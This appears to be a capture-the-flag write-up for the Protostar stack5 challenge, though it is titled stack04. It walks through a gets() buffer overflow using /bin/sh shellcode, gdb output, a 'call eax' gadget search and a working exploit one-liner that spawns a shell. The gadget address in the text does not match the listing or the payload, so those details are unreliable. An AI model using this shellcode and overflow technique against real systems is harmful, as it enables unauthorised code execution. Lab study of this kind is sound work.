---
layout: post
title: "Protostar stack04 writeup"
tags: [protostar, pwn]
comments: false
---

This challenge gives out a source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Unlike from the other challenges, this one doesn't contain any functions like the win() function.
In the challenge description it says to use shellcode.

my shellcode where it executes /bin/sh will be
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
```
which is 25 bytes

When I was going through the binary I realized that the register eax contains the start of the buf[64] address

```
(gdb) b *main+21
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
(gdb) r
Starting program: /opt/protostar/bin/stack5 
AAAA

Breakpoint 1, main (argc=1, argv=0xbffffd54) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) x/10x $esp
0xbffffc50:     0xbffffc60      0xb7ec6165      0xbffffc68      0xb7eada75
0xbffffc60:     0x41414141      0x08049500      0xbffffc78      0x080482c4
0xbffffc70:     0xb7ff1040      0x0804958c
(gdb) info reg
eax            0xbffffc60       -1073742752
```

So if I start the buf[64] by putting in the shellcode then put in some dummy values to reach ret and then overwrite it with an address that calls eax(which will be call eax) then it will run the shellcode.

to find an instruction of call eax
```
root@protostar:/opt/protostar/bin# objdump -d stack5 -M intel | grep call
 804829f:       e8 00 00 00 00          call   80482a4 <_init+0xc>
 80482b5:       e8 1e 00 00 00          call   80482d8 <__gmon_start__@plt>
 80482ba:       e8 e1 00 00 00          call   80483a0 <frame_dummy>
 80482bf:       e8 8c 01 00 00          call   8048450 <__do_global_ctors_aux>
 804832c:       e8 c7 ff ff ff          call   80482f8 <__libc_start_main@plt>
 8048378:       ff 14 85 ac 94 04 08    call   DWORD PTR [eax*4+0x80494ac]
 80483bf:       ff d0                   call   eax
 80483d4:       e8 0f ff ff ff          call   80482e8 <gets@plt>
 80483f6:       e8 4f 00 00 00          call   804844a <__i686.get_pc_thunk.bx>
 8048404:       e8 8f fe ff ff          call   8048298 <_init>
 8048434:       ff 94 b3 18 ff ff ff    call   DWORD PTR [ebx+esi*4-0xe8]
 804846b:       ff d0                   call   eax
 8048483:       e8 00 00 00 00          call   8048488 <_fini+0xc>
 804848f:       e8 ac fe ff ff          call   8048340 <__do_global_dtors_aux>
```

You can see that call eax is located at 0x804846d

So if we make a exploit it will be

```
root@protostar:/opt/protostar/bin# (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"A"*51+"\xbf\x83\x04\x08"';cat) | ./stack5
whoami
root
```

even though I am already on root, it's fine because we can still see that the shellcode worked.

